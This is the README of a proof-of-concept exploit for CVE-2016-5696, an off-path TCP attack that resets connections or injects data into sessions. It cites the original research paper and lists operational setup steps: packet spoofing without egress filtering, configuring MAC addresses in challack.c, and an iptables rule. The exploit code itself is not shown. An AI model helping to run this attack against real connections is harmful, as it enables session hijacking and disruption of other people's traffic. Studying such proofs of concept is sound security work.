# Proof-of-concept code for CVE-2016-5696

This code currently allows reseting connections or injecting into sessions. The attack is implemented against both clients and servers.

For detailed information, consult the original publication:

[Off-Path TCP Exploits: Global Rate Limit Considered Dangerous](http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf)

# Requirements

1. You need to be able to spoof packets (no egress filtering).
2. You'll need to update *ROUTER_MAC* and *LOCAL_MAC* in *challack.c* with your spoof-ready machine's details.
2. You need iptables installed to DROP packets from the target host/port.  Otherwise, your legitimate TCP stack will interfere with this program's operation.  This will appear as an immediate RST after connection establishment.
